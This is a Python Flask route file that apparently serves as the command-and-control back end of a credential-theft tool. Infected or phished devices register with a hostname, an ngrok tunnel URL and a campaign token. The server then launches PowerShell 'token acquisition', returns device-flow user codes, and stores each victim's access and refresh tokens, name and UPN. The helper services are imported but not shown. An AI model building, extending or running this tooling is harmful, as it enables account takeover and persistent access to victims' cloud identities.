"""
API routes for the Kodes server.
"""
from flask import Blueprint, request, jsonify, redirect, url_for
import logging
from ..services.device import DeviceService
from ..services.powershell import PowerShellService
from ..services.campaign import CampaignService
from ..models import db
from ..utils.validators import valid_hostname, valid_ngrok_url

logger = logging.getLogger(__name__)

api_bp = Blueprint('api', __name__)


@api_bp.route('/', methods=['GET'])
def device_endpoint():
    """
    Main device endpoint for registration and status checks.
    """
    hostname = request.args.get('h')
    ngrok_url = request.args.get('url')
    campaign_token = request.args.get('c')

    if not hostname:
        return redirect(url_for('auth.login'))

    # Ingress validation: the hostname reaches PowerShell commands, logs and
    # panel JS contexts — reject anything outside a strict hostname charset
    if not valid_hostname(hostname):
        logger.warning(f"Rejected invalid hostname from {request.remote_addr}: {hostname[:60]!r}")
        return "Invalid hostname", 400

    # The tunnel URL is rendered back into panel JS contexts; accept only
    # strict tcp://host:port / tls://host:port forms
    if ngrok_url and not valid_ngrok_url(ngrok_url):
        logger.warning(f"Rejected invalid ngrok url from {request.remote_addr}: {str(ngrok_url)[:80]!r}")
        return "Invalid url", 400

    device_service = DeviceService()

    device = device_service.get_device(hostname)

    if not device:
        device = device_service.register_device(hostname, ngrok_url)

        try:
            CampaignService.apply_campaign_token(device, campaign_token)
        except Exception as e:
            logger.warning(f"Campaign token handling failed for {hostname}: {e}")

        powershell_service = PowerShellService()
        success, result = powershell_service.start_token_acquisition(hostname)
        
        if not success:
            logger.error(f"Token acquisition failed for {hostname}: {result}")
            return result, 500
        
        if result == "OK":
            return "OK", 200
        elif result == "PROCESSING":
            return "PROCESSING", 202
        else:
            return result, 201
    
    else:
        if ngrok_url:
            device = device_service.update_device(hostname, ngrok_url=ngrok_url)
        else:
            device = device_service.update_device(hostname)

        try:
            CampaignService.apply_campaign_token(device, campaign_token)
        except Exception as e:
            logger.warning(f"Campaign token handling failed for {hostname}: {e}")

        if device.access_token and device.refresh_token:
            logger.info(f"Device {hostname} has valid tokens in database")
            
            if device.name:
                logger.info(f"Device {hostname} has user name: {device.name}")
            if device.upn:
                logger.info(f"Device {hostname} has UPN: {device.upn}")
                
            return "OK", 200
        else:
            from ..utils.powershell import process_tokens_for_device, check_active_session, active_sessions, sessions_lock
            
            if process_tokens_for_device(hostname, db.session):
                logger.info(f"Tokens found in log file for {hostname}, returning OK")
                return "OK", 200
            
            has_active_session = check_active_session(hostname)
            user_code = None
            
            if has_active_session:
                logger.info(f"Device {hostname} has active PowerShell session")
                with sessions_lock:
                    if hostname in active_sessions:
                        if isinstance(active_sessions[hostname], dict):
                            if active_sessions[hostname].get('tokens_processed'):
                                logger.info(f"Tokens already processed for {hostname}")
                                user_code = "OK"
                            elif active_sessions[hostname].get('token_found'):
                                logger.info(f"Token found for {hostname} but still processing")
                                user_code = "PROCESSING"
                            elif 'user_code' in active_sessions[hostname]:
                                user_code = active_sessions[hostname]['user_code']
                                logger.info(f"Reusing existing user_code {user_code} for {hostname}")
                        elif hasattr(active_sessions[hostname], 'user_code') and active_sessions[hostname].user_code:
                            user_code = active_sessions[hostname].user_code
                            logger.info(f"Reusing existing user_code {user_code} for {hostname}")
            
            if user_code:
                if user_code == "OK":
                    return "OK", 200
                elif user_code == "PROCESSING":
                    return "PROCESSING", 202
                else:
                    return user_code, 201
            
            logger.info(f"Existing device {hostname} without tokens, starting token acquisition")
            powershell_service = PowerShellService()
            success, result = powershell_service.start_token_acquisition(hostname)
            
            if not success:
                logger.error(f"Token acquisition failed for {hostname}: {result}")
                return result, 500
            
            if result == "OK":
                return "OK", 200
            elif result == "PROCESSING":
                return "PROCESSING", 202
            else:
                return result, 201
